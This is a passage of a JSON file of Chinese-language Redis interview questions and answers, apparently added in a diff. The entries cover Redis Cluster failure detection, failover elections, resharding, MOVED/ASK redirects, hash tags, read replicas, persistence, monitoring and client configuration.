+      "answer": "Redis 集群节点故障检测中主观下线（PFAIL）与客观下线（FAIL）的区别：PFAIL（Possibly Fail，主观下线）：单个节点 A 根据自己的判断认为节点 B 已下线。触发条件：A 向 B 发送 PING 后，cluster-node-timeout 时间内未收到 PONG 回复。仅 A 自己的判断，不意味着 B 真的故障（可能是网络分区、时钟偏差等原因）。其他节点可能仍能正常与 B 通信。PFAIL 信息通过 Gossip 协议传播。FAIL（客观下线）：集群多数主节点达成共识确认 B 已下线。触发条件：某个节点（通常是第一个标记 PFAIL 的节点）发现超过半数的主节点都将 B 标记为 PFAIL，则将 B 标记为 FAIL 并广播 FAIL 消息。收到 FAIL 消息的节点立即将 B 标记为 FAIL。FAIL 是触发故障转移的信号——B 的从节点看到主节点被标记为 FAIL 后启动选举流程。两阶段设计避免单一节点的误判引发不必要的故障转移。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群中，节点故障检测的过程是怎样的（主观下线 PFAIL vs 客观下线 FAIL） ?"
+    },
+    {
+      "number": 171,
+      "id": "Redis 数据库面试题-171",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群从节点选举为新的主节点过程中，通过复制偏移量（replication offset）尽可能保证数据不丢失：1）复制偏移量是主从同步过程中主和从分别维护的一个计数器，表示已处理的复制流字节数；2）主节点每发送 N 字节数据给从节点，主节点的 offset += N；从节点每接收 N 字节数据，从节点的 offset += N；3）主节点故障时，所有从节点的 offset 可能不同（因为复制是异步的），offset 最大的从节点通常拥有最完整的数据；4）选举资格：从节点与主节点断开时间必须不超过 cluster-node-timeout × cluster-replica-validity-factor（默认 10 倍），保证从节点数据不是太陈旧；5）选举中如果多个从节点竞选，offset 更大的从节点更有可能获得投票（因为主节点倾向于把票投给拥有最新偏移量的从节点）；6）新主节点选举后还会做一次增量同步（从故障前的主节点或已有的复制数据中补齐差异）。尽管有这些机制，异步复制仍有微量丢数据的可能，可通过 WAIT 命令增强。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群从节点选举成为新主节点的过程是如何保证数据尽可能不丢失的（复制偏移量） ?"
+    },
+    {
+      "number": 172,
+      "id": "Redis 数据库面试题-172",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群故障转移过程中，其他节点感知并更新集群状态的方式：1）FAIL 消息广播：当某个节点将故障主节点标记为 FAIL 后，立即通过 Gossip 协议的 FAIL 消息向集群所有节点广播（不是逐跳传播，而是尽快通知所有节点）；2）新主节点角色广播：选举成功的新主节点立即通过 PONG 消息向所有集群节点宣告自己已接管原主节点的哈希槽，消息中包含新的 configEpoch 和槽位图；3）Gossip 传播：所有节点在后续的 PING/PONG 消息中携带最新的 clusterState 信息（节点角色、槽分配、configEpoch 变化），使集群状态逐步收敛到一致；4）configEpoch 机制保证一致性（冲突解决中 configEpoch 更大的配置信息胜出），避免脑裂或双主冲突；5）从节点角色变更：原主节点的其他从节点检测到故障转移完成后，自动切换复制目标为新主节点（REPLICATE new_master_node_id）；6）客户端端通过 MOVED 重定向感知槽的迁移和新主节点位置。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述在 Redis 集群的故障转移过程中，其他节点是如何感知并更新集群状态的 ?"
+    },
+    {
+      "number": 173,
+      "id": "Redis 数据库面试题-173",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群的不可用状态（CLUSTERDOWN）发生在以下情况：1）当某个主节点负责的哈希槽没有一个可用的从节点（且主节点本身故障），即该哈希槽既没有主节点也没有从节点可提供服务→集群进入 FAIL 状态。因为该槽的数据完全不可访问，集群不能返回部分数据。2）当集群中超过半数的主节点不可用时，集群无法完成故障转移选举（无法获得多数票），集群不可用。3）当哈希槽分配不完整（有槽未被任何节点负责）时集群不可用。4）集群检测内存在哈希槽分配冲突（两个节点声称负责同一槽）且无法通过 configEpoch 裁决解决时可能不可用。解决方案：确保每个主节点至少有一个从节点、部署足够数量的哨兵或集群节点、定期执行 redis-cli --cluster check 检查集群健康状态、及时修复故障节点。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述什么是 Redis 集群的不可用状态在什么情况下整个集群会不可用（例如，某个主节点及其所有从节点同时宕机） ?"
+    },
+    {
+      "number": 174,
+      "id": "Redis 数据库面试题-174",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群支持同时进行多个故障转移，通过以下机制避免多个从节点同时选举导致的冲突：1）延迟选举机制：从节点发现其主节点 FAIL 后会等待一段随机时间（延迟计算公式涉及 replica rank 和固定延迟），拥有最新复制偏移量的从节点延迟最短，最可能率先发起选举；2）每个 epoch 只有一次选举：从节点发起选举时递增 currentEpoch，每个主节点在每个 epoch 内只能投一票（投票给第一个向它请求投票的从节点）；3）configEpoch 冲突解决：如果两个从节点同时选举（罕见），configEpoch 更大的配置信息胜出，另一个从节点发现冲突后放弃并重试；4）只有具备选举资格的从节点才能发起选举（断开时间不超过 cluster-node-timeout × cluster-replica-validity-factor）；5）如果一个主节点获得多数票，它通过 PONG 宣告新角色和槽所有权，其他竞选者的选举请求被拒绝；6）集群支持同时有多个不同主节点的从节点进行选举（即多个故障转移并行进行），只要它们不是竞争同一个槽的归属。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群支持同时进行故障转移吗如何避免多个从节点同时发起选举导致的冲突 ?"
+    },
+    {
+      "number": 175,
+      "id": "Redis 数据库面试题-175",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群支持在线水平扩展（增加或减少节点）。增加节点过程：1）启动新 Redis 节点（cluster-enabled yes），目前是空节点未分配任何槽；2）使用 redis-cli --cluster add-node new_host:new_port existing_host:existing_port 将新节点加入集群（作为主节点）；3）如新节点需作为某个主节点的从节点：redis-cli --cluster add-node new_host:new_port existing_host:existing_port --cluster-slave --cluster-master-id <master_node_id>；4）为新主节点分配哈希槽：redis-cli --cluster reshard host:port，选择要迁移的槽数、目标节点、来源节点，集群逐个迁移槽（每个槽迁移时逐个 key MIGRATE）。减少节点过程：1）先将待移除节点的槽全部迁移到其他节点：redis-cli --cluster reshard（选来源为待移除节点，目标为接收节点）；2）迁移完成后使用 redis-cli --cluster del-node host:port node_id 从集群中移除空节点（没有槽的节点才能安全移除）。整个过程在线进行，不影响已有数据的读写（迁移中的槽通过 ASK 重定向临时处理）。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群支持在线水平扩展（增加或减少节点）吗这个过程是如何工作的 ?"
+    },
+    {
+      "number": 176,
+      "id": "Redis 数据库面试题-176",
+      "category": "Redis 数据库",
+      "answer": "向 Redis 集群添加新主节点后，需要通过 reshard 操作为其分配哈希槽（让新节点负责一部分数据）：1）执行 redis-cli --cluster reshard host:port；2）按提示输入需要迁移的槽数量（例如 4096 个槽从已有节点迁移到新节点）；3）输入新节点的 node ID（通过 CLUSTER NODES 获取）；4）选择迁移来源：可输入 all（从所有已有节点均匀迁移）或指定某个节点的 node ID，最后输入 done 执行；5）集群逐槽执行迁移：对每个槽，目标节点执行 CLUSTER SETSLOT slot IMPORTING source_node_id，源节点执行 CLUSTER SETSLOT slot MIGRATING target_node_id；然后源节点逐个迁移槽内的 key（MIGRATE 命令，支持单个 key 和整个槽的 pipeline 迁移）；6）所有 key 迁移完成后，源和目标节点都执行 CLUSTER SETSLOT slot NODE target_node_id 将槽归属更新为新的节点；7）迁移过程中，客户端请求迁移中的 key 时，如果 key 还在源节点则正常返回，如果已迁移到目标节点，源节点返回 ASK 重定向引导客户端去新节点。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述当向 Redis 集群中添加一个新节点时，需要执行什么操作来让它负责一部分哈希槽（reshard） ?"
+    },
+    {
+      "number": 177,
+      "id": "Redis 数据库面试题-177",
+      "category": "Redis 数据库",
+      "answer": "从 Redis 集群中移除一个主节点时，必须先将其负责的哈希槽迁移到其他节点：1）使用 redis-cli --cluster reshard host:port 启动槽迁移；2）选择要迁移的槽数量（该节点负责的全部槽）；3）输入待移除节点的 node ID 作为来源（source）；4）指定目标节点（一个或多个已有主节点作为接收者）；5）执行迁移，逐个槽将数据 MIGRATE 到目标节点，完成后将槽归属更新为目标节点；6）确认待移除节点的所有槽都已迁移且归零：redis-cli --cluster check host:port 验证；7）执行 redis-cli --cluster del-node host:port node_id_of_removed 从集群中移除空节点；8）如果待移除的是从节点（没有负责的槽），直接执行 del-node 即可移除。注意：移除前要确保移除后集群仍有充足节点保证每主节点有从节点和数据安全，移除过程中集群正常对外服务。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述当从 Redis 集群中移除一个节点时，需要先做什么操作（将其负责的哈希槽迁移出去） ?"
+    },
+    {
+      "number": 178,
+      "id": "Redis 数据库面试题-178",
+      "category": "Redis 数据库",
+      "answer": "哈希槽迁移期间，客户端可以继续读写数据。Redis 通过以下机制处理：1）ASK 重定向：当客户端请求某个 key 时，如果该 key 已被迁移到目标节点（不在源节点），源节点返回 ASK 重定向错误（-ASK slot target_ip:target_port），客户端向目标节点发送 ASKING 命令后再发送原始命令获取数据。ASK 是一次性重定向（仅本次请求），与 MOVED 不同（MOVED 是永久性槽归属变更）。2）MOVED 重定向：迁移完成后槽归属永久更新，后续对新节点的请求由 MOVED 重定向引导。3）迁移过程中的读写一致性：源节点在处理迁移中的槽时对每个 key 单独处理——如果 key 还在源（未迁移）则正常返回，如果 key 已迁移则返回 ASK。4）MIGRATE 命令是原子的（在源节点删除 key 和目标节点创建 key 是原子操作）。5）迁移过程中可能短暂出现 key 在源和目标都能找到的情况（先恢复后删除的策略），但不影响最终一致性。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述哈希槽迁移期间，客户端是否可以继续读写数据Redis 是如何处理的（ASK 重定向） ?"
+    },
+    {
+      "number": 179,
+      "id": "Redis 数据库面试题-179",
+      "category": "Redis 数据库",
+      "answer": "ASK 重定向和 MOVED 重定向的区别：1）MOVED 重定向表示槽的归属已永久变更。当客户端向节点 A 请求某个 key 时，如果该 key 所在槽已被永久分配到节点 B，节点 A 返回 MOVED slot target_ip:port 错误。客户端收到 MOVED 后应更新本地槽→节点映射表（永久缓存），之后对该槽的所有请求直接发送到新节点 B。2）ASK 重定向表示槽正在迁移中（临时状态）。当槽处于 MIGRATING（源节点）和 IMPORTING（目标节点）状态时，源节点收到对已迁移 key 的请求返回 ASK slot target_ip:port 错误。客户端收到 ASK 后先向目标节点发送 ASKING 命令（强制目标节点处理本次请求），再发送原始命令。ASK 是一次性的，不更新槽映射缓存。3）总结：MOVED=永久变更（更新缓存），ASK=临时迁移（仅本次请求），ASKING 是目标节点绕过 IMPORTING 状态的检查。",
+      "tags": [],
+      "question": "请简述ASK 重定向和 MOVED 重定向有什么区别 ?"
+    },
+    {
+      "number": 180,
+      "id": "Redis 数据库面试题-180",
+      "category": "Redis 数据库",
+      "answer": "在 Redis 集群模式下，客户端处理 MOVED 和 ASK 重定向的机制：1）MOVED 重定向处理：收到 -MOVED slot ip:port 错误→解析新的节点地址→更新本地槽映射表（将该 slot 映射到新节点）→向新节点重新发送原命令→新节点正常返回结果。2）ASK 重定向处理：收到 -ASK slot ip:port 错误→先向新节点发送 ASKING 命令→收到 +OK 响应→向新节点发送原始命令→新节点返回结果。注意不能更新槽映射表（ASK 是临时的）。3）重试/重定向上限：客户端应设置最大重定向次数（如 5 次），防止无限重定向。4）常见客户端实现：JedisCluster 内置自动处理 MOVED/ASK；Lettuce 的 ClusterTopologyRefresh 自动刷新拓扑；go-redis 自动重定向并更新路由表。5）智能客户端（Smart Client）：启动时通过 CLUSTER SLOTS 命令获取全集群槽映射表并缓存，之后根据本地映射直接发到正确节点，仅在映射过期时收到 MOVED 后更新缓存。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述在 Redis 集群模式下，客户端是如何处理 MOVED 和 ASK 重定向的 ?"
+    },
+    {
+      "number": 181,
+      "id": "Redis 数据库面试题-181",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群对多键操作（MGET、MSET、事务、Lua 脚本）有严格限制——所有操作的 key 必须在同一个哈希槽（也就是同一个节点）上。原因：集群模式下，数据按槽分布在不同的节点，跨节点的多 key 操作需要跨节点协调（分布式事务），Redis 集群出于性能和实现简洁性的考量不做跨节点协调。限制包括：1）MSET key1 v1 key2 v2——所有 key 必须在同一槽；2）MGET key1 key2——所有 key 必须在同一槽；3）事务 MULTI/EXEC 中的命令——涉及的所有 key 必须在同一槽；4）Lua 脚本 EVAL/EVALSHA——脚本中操作的所有 key 必须在同一槽；5）SUNION/SINTER/SDIFF——集合操作的多个 key 必须在同一槽；6）RENAME key1 key2——两 key 须在同一槽。解决方案：使用 Hash Tag（{}）强制相关 key 计算到相同哈希槽，如 {user:1001}:profile 和 {user:1001}:orders。",
+      "tags": [
+        "Redis",
+        "事务"
+      ],
+      "question": "请简述Redis 集群支持多键操作（如 MGET、MSET、事务、Lua 脚本）吗有什么限制（所有 key 必须在同一个节点上） ?"
+    },
+    {
+      "number": 182,
+      "id": "Redis 数据库面试题-182",
+      "category": "Redis 数据库",
+      "answer": "哈希标签（Hash Tag）是将多个相关 key 强制存储到同一哈希槽的机制。使用方式：在 key 中使用花括号 {} 包裹一段内容，Redis 集群在计算 CRC16 时只对 {} 内的部分进行计算，而非整个 key。例如：key1 = '{user:1001}:profile'、key2 = '{user:1001}:orders'（只对 'user:1001' 做 CRC16），两个 key 会分配到同一哈希槽。应用场景：1）当需要对同一用户/订单的多个属性做 MGET/MSET 批量操作时；2）事务中需要操作同一实体的多个 key；3）Lua 脚本中需要操作多个关联 key。注意事项：1）{} 必须包含有意义的内容（不能是空的 {}）；2）不要把所有 key 挤到同一槽导致数据倾斜和热点；3）合理设计 {} 内容（如按用户 ID、订单 ID 分组），保持槽分布均匀；4）Hash Tag 仅被集群模式识别，单机和哨兵模式忽略 {}。",
+      "tags": [],
+      "question": "请简述如何通过哈希标签（Hash Tag）强制将多个相关键存储到同一个哈希槽中 ?"
+    },
+    {
+      "number": 183,
+      "id": "Redis 数据库面试题-183",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群的事务（MULTI/EXEC）不支持跨节点执行。集群事务限制：事务中操作的所有 key 必须位于同一个哈希槽（同一个节点）。原因：Redis 集群是去中心化 P2P 架构，没有全局事务协调器，跨节点事务需要引入二阶段提交（2PC）等分布式事务协议，这会大幅增加复杂度和延迟，与 Redis 简单高性能的设计理念冲突。解决方案：1）使用 Hash Tag（{xxx}）将事务涉及的所有 key 聚集到同一槽；2）在应用层使用分布式事务框架（如 Seata Saga 模式）协调跨节点操作；3）重新设计数据模型，避免跨节点事务需求。如果确实需要大量跨节点事务，考虑使用的是否正确的技术方案（如分布式关系型数据库或基于 ZK/etcd 的协调方案）。",
+      "tags": [
+        "Redis",
+        "事务"
+      ],
+      "question": "请简述Redis 集群的事务（MULTI/EXEC）是否支持跨节点 ?"
+    },
+    {
+      "number": 184,
+      "id": "Redis 数据库面试题-184",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群的 Lua 脚本不支持跨节点执行。脚本中操作的所有 key 必须在同一个哈希槽（同一节点）上。原因：与事务限制相同，跨节点的 Lua 脚本执行需要分布式事务协调（脚本的全部操作需原子地在多个节点执行），Redis 集群设计上不做跨节点原子性保证。处理方案：1）使用 Hash Tag 将脚本涉及的 key 强制分配到同一节点；2）将复杂逻辑拆分为多个单节点 Lua 脚本，在应用层编排执行顺序（牺牲原子性）；3）使用 EVALSHA 传递 key 参数时，Redis 检查所有 key 是否在同一节点，不在则返回 CROSSSLOT 错误；4）设计数据模型时预留 Lua 脚本操作的便利性——相关联的数据尽可能使用 Hash Tag 存到同一节点。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群的 Lua 脚本是否支持跨节点 ?"
+    },
+    {
+      "number": 185,
+      "id": "Redis 数据库面试题-185",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群处理 SCAN 命令的方式与单机版不同：单机版 SCAN 遍历当前数据库的所有 key。集群模式下 SCAN 只遍历当前连接节点的 key，不会自动跨节点。遍历整个集群所有 key 的方法：1）获取所有主节点列表（CLUSTER NODES）；2）依次连接每个主节点并执行 SCAN；3）将每个节点的 SCAN 结果合并去重（理论上不会重复，因为每个 key 只属于一个节点）；4）使用 redis-cli --cluster call host:port SCAN 0（或遍历所有节点）；5）借助客户端库（如 JedisCluster 无原生全集群 SCAN，需手动遍历所有节点）。注意：SCAN 的 cursor 是节点内的状态，跨节点不关联；多节点 SCAN 不能保证全局一致性（在扫描期间可能有 key 增减）。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群如何处理 SCAN 命令它与单机版的 SCAN 有何不同（每次返回一个节点） ?"
+    },
+    {
+      "number": 186,
+      "id": "Redis 数据库面试题-186",
+      "category": "Redis 数据库",
+      "answer": "在 Redis 集群中遍历所有键的方法：由于集群数据分布在多个节点，需要在每个主节点上分别执行 SCAN。步骤：1）通过 CLUSTER NODES 获取所有主节点列表（过滤 slave 和 fail 节点）；2）对每个主节点建立连接并执行 SCAN 命令：SCAN 0 MATCH pattern COUNT 1000，每次获取一批 key 和新的 cursor；3）当 cursor 返回 0 时表示当前节点遍历完成；4）各节点结果合并即全集群的 key 列表。代码实现注意：每个节点的 SCAN 应独立进行，可使用多线程并行加速；SCAN 不保证全局一致性（可能遗漏或重复遍历期间变动的 key）；生产环境慎用，大数据量遍历对性能有影响。也可使用 redis-cli --cluster call 在所有节点执行命令。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述在 Redis 集群中，如何遍历所有键（需要依次扫描每个节点） ?"
+    },
+    {
+      "number": 187,
+      "id": "Redis 数据库面试题-187",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群默认不支持主从读写分离（所有读写默认走主节点），但可以通过 READONLY 命令在从节点上进行读操作。默认行为：客户端向从节点发送读命令时，从节点会返回 MOVED 重定向指向负责该槽的主节点。使用 READONLY 后：客户端连接从节点→发送 READONLY 命令→此连接后续的读请求由从节点直接处理（不再重定向到主节点），写请求仍重定向到主节点。注意事项：1）从节点读可能有数据延迟（异步复制导致，可能读到旧数据）；2）READONLY 是连接级别的，断开后失效；3）需要客户端支持（Lettuce 的 ReadFrom.REPLICA、Jedis 需手动发送 READONLY）；4）适合数据一致性要求不高的场景（如浏览历史、热门排行）；5）需要在配置中将 replica-read-only 设为 yes（默认）。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群支持主从读写分离吗在集群模式下，从节点可以处理读请求吗（可以通过 READONLY 命令） ?"
+    },
+    {
+      "number": 188,
+      "id": "Redis 数据库面试题-188",
+      "category": "Redis 数据库",
+      "answer": "在 Redis 集群中使用从节点读时保证数据一致性是一个取舍问题。默认情况下从节点复制是异步的，无法保证强一致性。减少不一致的方法：1）控制主从延迟：通过 INFO replication 监控 lag 指标（主从偏移量差值），如果延迟超过阈值则不读从节点；2）WAIT 命令：写操作后执行 WAIT num_replicas timeout 等待至少 N 个从节点确认复制后再返回客户端，牺牲写性能换取一致读；3）业务容忍设计：对数据一致性不敏感的场景（如下拉推荐、浏览排名）才读从节点，敏感场景（如余额、订单状态）始终读主节点；4）短过期时间缓存：设置短 TTL，即使读到旧数据也很快过期；5）Redis 企业版支持 Active-Active 多活复制提供更强的一致性；6）如果需要强一致性读写，建议使用主节点读写，从节点仅做故障备份。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述在 Redis 集群中使用从节点读时，如何保证数据的一致性（可能存在数据延迟） ?"
+    },
+    {
+      "number": 189,
+      "id": "Redis 数据库面试题-189",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群中 RDB 和 AOF 持久化可以在每个节点上独立配置。持久化是节点级别的设置，不通过集群协议同步或统一管理。配置方式：1）在每个节点的 redis.conf 中独立配置 RDB（save 参数）和 AOF（appendonly yes/no、appendfsync 等）；2）不同节点的持久化策略可以不同：例如主节点关闭持久化（纯内存提高性能），从节点开启 AOF+RDB 提供持久化保障；3）持久化文件（dump.rdb、appendonly.aof）存储在各节点的本地磁盘上；4）备份时需要对每个节点分别备份（或只备份从节点）；5）故障恢复：节点故障后可用其持久化文件恢复数据并重新加入集群，集群通过 Gossip 协议感知节点回归并更新状态。注意：持久化配置的差异不应该影响主从数据复制的一致性——复制是独立于持久化的机制。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群的备份（持久化）是如何配置的RDB 和 AOF 是否可以在集群中独立配置 ?"
+    },
+    {
+      "number": 190,
+      "id": "Redis 数据库面试题-190",
+      "category": "Redis 数据库",
+      "answer": "在 Redis 集群环境中选择持久化策略需综合考虑性能和数据安全：1）推荐全节点开启 AOF + 混合持久化：appendonly yes、aof-use-rdb-preamble yes、appendfsync everysec。每秒 fsync 的性能损失约 5-10%，但最多丢 1 秒数据。2）RDB 作为补充（冷备）：save 900 1 / save 300 10 / save 60 10000，防止 AOF 文件损坏无法恢复。3）从节点持久化策略可以更强（如 appendfsync always），利用从节点做持久化保证（主节点甚至可以不持久化以提高写入性能），但故障转移时新主节点数据可能不如原持久化完备。4）性能敏感场景：主节点只开 RDB 或 even 无持久化（纯缓存模式），从节点开 AOF 做备份。5）需要 100% 数据安全的场景：appendfsync always（每次写都 fsync，性能最差），或使用企业级 Redis 的方案。6）定期备份：对至少一个节点的 RDB/AOF 文件做异地备份。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述在 Redis 集群环境中，如何选择合适的持久化策略（综合考虑性能和数据安全） ?"
+    },
+    {
+      "number": 191,
+      "id": "Redis 数据库面试题-191",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群官方建议最大节点数不超过 1000 个，主节点数约 500 个。性能瓶颈分析：1）Gossip 协议通信开销：每个节点每秒随机 ping 若干节点，所有节点维护全拓扑信息，节点数增加时 Gossip 消息量 O(N)，带宽开销增大；2）心跳包大小：PING/PONG 消息携带槽位图（2KB per bitmap）和 gossip 段（约 100 字节/节点信息），节点多时单条消息体积增大；3）故障检测延迟：节点越多，PFAIL 信息传播和收集多数票的时间越长；4）全拓扑内存开销：每个节点存储全集群节点信息和槽分配表，节点多时代理内存消耗可观；5）选举复杂度：大规模集群中选举协调难度增加，可能影响故障转移速度。实际建议：主节点控制在 100 以内，约 200-300 槽/节点。如需更大规模，采用多集群联邦或代理方案。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群的最大节点数量是多少性能瓶颈在哪里（节点间 Gossip 通信开销） ?"
+    },
+    {
+      "number": 192,
+      "id": "Redis 数据库面试题-192",
+      "category": "Redis 数据库",
+      "answer": "监控 Redis 集群健康状况和性能指标的方法：1）CLUSTER INFO：查看 cluster_state（ok/fail）、cluster_slots_assigned、cluster_slots_ok、cluster_slots_pfail、cluster_known_nodes 等关键状态指标；2）CLUSTER NODES：查看每个节点的 ID、IP:PORT、角色（master/slave）、flags、负责槽范围等；3）INFO 命令（每个节点）：关注 Server、Clients、Memory、Stats（keyspace_hits/misses、evicted_keys）、Replication（master_repl_offset、slave 的 lag）、CPU；4）SLOWLOG GET：定期采集慢查询日志分析性能瓶颈；5）Prometheus + Grafana：使用 redis_exporter 采集指标→Prometheus 存储→Grafana 可视化展示（推荐 Dashboard ID 763）；6）设置告警：集群状态异常、主从延迟超过阈值、内存使用率 > 80%、慢查询数量激增、节点下线等；7）redis-cli --cluster check host:port 检查集群配置一致性。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述如何监控 Redis 集群的健康状况和性能指标（如 CLUSTER INFO、INFO 命令、监控系统） ?"
+    },
+    {
+      "number": 193,
+      "id": "Redis 数据库面试题-193",
+      "category": "Redis 数据库",
+      "answer": "CLUSTER INFO 命令输出字段含义：1）cluster_state：ok（集群正常）或 fail（集群不可用，有槽无服务节点）；2）cluster_slots_assigned：已被分配给节点的槽数量（正常为 16384）；3）cluster_slots_ok：处于正常服务状态的槽数量（应等于 slots_assigned）；4）cluster_slots_pfail：处于 PFAIL 状态的槽数量（应始终为 0）；5）cluster_slots_fail：处于 FAIL 状态的槽数量（应始终为 0）；6）cluster_known_nodes：集群中所有已知节点总数（包括自身）；7）cluster_size：集群中可用的主节点数量；8）cluster_current_epoch：当前集群中最大的 epoch 值（用于配置冲突裁决），每次故障转移递增；9）cluster_my_epoch：当前节点的 config epoch；10）cluster_stats_messages_ping_sent / pong_sent / sent / received：Gossip 消息通信统计。cluster_state 是判断集群是否健康的最重要单一指标。",
+      "tags": [],
+      "question": "请简述CLUSTER INFO 命令输出的 cluster_state、cluster_slots_assigned、cluster_known_nodes 等字段的含义是什么 ?"
+    },
+    {
+      "number": 194,
+      "id": "Redis 数据库面试题-194",
+      "category": "Redis 数据库",
+      "answer": "常见的 Redis 集群部署架构：1）3 主 3 从（最少生产配置）：6 个节点分别部署在 3 台/6 台服务器上，每台服务器的 Redis 实例可以相互做主从对。优势是最低成本保证高可用，可容忍 1 个主节点和任意数量的从节点故障（只要不是主从对同时故障）。2）6 主 6 从：12 个节点，每个主节点有 1 个从节点，更高并发和更大容量，可容忍多节点故障。3）3 主 0 从（仅开发/测试环境）：无冗余，任何主节点故障即导致集群不可用（部分槽无服务），不建议生产使用。4）跨数据中心部署：主从分布在不同的数据中心/可用区（如 AWS 3 个 AZ，每个 AZ 有 1 主 1 从），防止单数据中心故障。5）大机房单机架：6 台物理机，每台部署多个 Redis 实例，需确保主从不在一台物理机上。原则：主节点和其从节点尽可能部署在不同物理机/机架/可用区。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述常见的 Redis 集群部署架构有哪些（如 3 主 3 从、6 主 0 从等） ?"
+    },
+    {
+      "number": 195,
+      "id": "Redis 数据库面试题-195",
+      "category": "Redis 数据库",
+      "answer": "部署生产可用的 Redis 集群需考虑的网络因素：1）低延迟网络：节点间 Gossip 心跳和复制对延迟敏感，PING 超时判断依赖 cluster-node-timeout（默认 15 秒），网络延迟波动大可能导致误判 PFAIL 甚至 FAIL。建议节点间延迟 < 1ms（同机房）或 < 5ms（同区域）。2）稳定可靠的网络：避免丢包率高、频繁抖动的网络，否则心跳失败和误判故障频发。3）节点发现机制：集群节点间通信使用两个端口——客户端端口（如 6379）和集群总线端口（客户端端口 + 10000，如 16379）。确保防火墙/安全组同时开放两个端口。4）带宽：Gossip 通信、主从复制、槽迁移、客户端请求都需要带宽，评估集群规模下的带宽需求（千兆网通常足够，大规模集群考虑万兆网）。5）内网部署：Redis 集群应在内网部署（不要暴露在公网），通过 VPN/专线连通多机房节点。6）DNS/主机名稳定性：节点 IP 变化可能导致集群拓扑失效，使用稳定的 DNS 主机名或固定 IP。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述部署一个生产可用的 Redis 集群需要考虑哪些网络因素（低延迟、稳定网络、节点发现机制） ?"
+    },
+    {
+      "number": 196,
+      "id": "Redis 数据库面试题-196",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群对客户端的要求：客户端必须支持集群协议（识别和自动处理 MOVED/ASK 重定向、缓存槽→节点映射表）。推荐客户端：1）Java：JedisCluster（基于 Jedis）、Lettuce（Spring Data Redis 默认，内置集群拓扑感知和自动刷新）、Redisson（分布式框架，RedisClusterClient）；2）Python：redis-py-cluster（或 redis-py 3.x+ 内置集群支持）、redis-py 的 RedisCluster 类；3）Go：go-redis/v9 的 NewClusterClient；4）Node.js：ioredis 内置 Cluster 支持；5）PHP：predis（纯 PHP 实现，支持集群）；6）.NET：StackExchange.Redis（内置集群支持）。智能客户端（Smart Client）启动时获取全集群槽映射并缓存，请求时直接在本地查找对应节点。非智能客户端只能连单个节点依赖 MOVED 重定向，性能较差。7）不支持集群的客户端可以通过 Proxy（如 Twemproxy/Codis）中转访问。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群对客户端有什么要求（必须支持集群协议，如 JedisCluster、Lettuce、Redis Cluster Client） ?"
+    },
+    {
+      "number": 197,
+      "id": "Redis 数据库面试题-197",
+      "category": "Redis 数据库",
+      "answer": "在 Spring Boot 中配置和连接 Redis 集群：1）application.yml 配置方式（推荐）：spring.redis.cluster.nodes=127.0.0.1:7000,127.0.0.1:7001,127.0.0.1:7002,127.0.0.1:7003,127.0.0.1:7004,127.0.0.1:7005；spring.redis.cluster.max-redirects=3；spring.redis.lettuce.pool.max-active=8 等连接池配置。2）Java Config 手动配置：创建 RedisClusterConfiguration 对象，设置集群节点列表（Set<RedisNode>）、最大重定向次数、密码等；创建 LettuceConnectionFactory 或 JedisConnectionFactory 传入 RedisClusterConfiguration；创建 RedisTemplate 或 StringRedisTemplate Bean 设置 ConnectionFactory。3）Lettuce 自动拓扑刷新（推荐开启）：ClusterTopologyRefreshOptions 配置定期刷新（如 30 秒）和事件触发刷新。4）验证连接：注入 RedisTemplate 后执行 redisTemplate.opsForValue().set('test', 'hello') → 确认能正常写入和读取。5）注意事项：集群模式下 SELECT 命令不可用（只用 DB 0），事务/Lua 脚本/Pipeline 涉及多 key 需用 Hash Tag。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述在 Spring Boot 中如何配置和连接 Redis 集群（使用 RedisClusterConfiguration 或连接字符串） ?"
+    },
+    {
+      "number": 198,
+      "id": "Redis 数据库面试题-198",
+      "category": "Redis 数据库",
